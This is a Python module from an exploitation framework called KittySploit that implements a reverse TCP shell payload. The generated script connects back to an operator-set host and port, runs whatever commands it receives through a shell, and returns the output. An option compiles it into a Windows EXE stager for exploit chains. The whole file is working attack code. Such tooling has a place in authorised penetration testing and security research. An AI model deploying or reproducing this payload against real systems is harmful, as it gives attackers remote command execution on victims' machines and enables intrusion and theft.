from kittysploit import *


class Module(Payload):
	"""Thin Python reverse TCP payload with optional Zig compile-to-EXE (stager delivery)."""

	CLIENT_LANGUAGE = "python"

	__info__ = {
		"name": "Python Reverse TCP (thin / EXE stager)",
		"description": (
			"Minimal Python reverse TCP shell. generate() returns a compact one-liner; "
			"set compile_exe=true to build a Windows EXE via Zig (get_python_script). "
			"Designed as a thin stager for exploit chains."
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.PYTHON,
		"platform": Platform.MULTI,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(4444, "Callback port", True)
	python_binary = OptString("python3", "Python on target (one-liner mode)", True)
	compile_exe = OptBool(False, "Compile to EXE with Zig instead of returning one-liner", False)
	output_path = OptString("payload_stager.exe", "EXE output path when compile_exe=true", False)
	standalone_exe = OptBool(False, "Standalone Windows EXE (embed Python runtime)", False, True)

	def get_python_script(self):
		host = str(self.lhost)
		port = int(self.lport)
		return (
			"import os,socket,subprocess,sys\n"
			f"s=socket.create_connection(({host!r},{port}))\n"
			"s.sendall(b'KittySploit thin python\\n')\n"
			"while 1:\n"
			" d=b''\n"
			" while not d.endswith(b'\\n'):\n"
			"  c=s.recv(1)\n"
			"  if not c: sys.exit(0)\n"
			"  d+=c\n"
			" cmd=d.decode('utf-8','replace').strip()\n"
			" if not cmd: continue\n"
			" if cmd.lower() in ('exit','quit'): break\n"
			" try:\n"
			"  p=subprocess.run(cmd,shell=True,capture_output=True,timeout=120)\n"
			"  out=(p.stdout or b'')+(p.stderr or b'') or ('exit %s\\n'%p.returncode).encode()\n"
			" except Exception as e:\n"
			"  out=('ERROR:%s\\n'%e).encode()\n"
			" s.sendall(out)\n"
			"s.close()\n"
		)

	def generate(self):
		script = self.get_python_script()
		if bool(self.compile_exe):
			out = str(self.output_path or "payload_stager.exe")
			ok = self.compile_python_to_exe(
				out,
				script=script,
				standalone=bool(self.standalone_exe),
			)
			if ok:
				print_success(f"EXE stager written: {out}")
				return f"# compiled: {out}"
			print_error("EXE compile failed; falling back to one-liner")
		return self._encode_python_one_liner(script, self.python_binary)
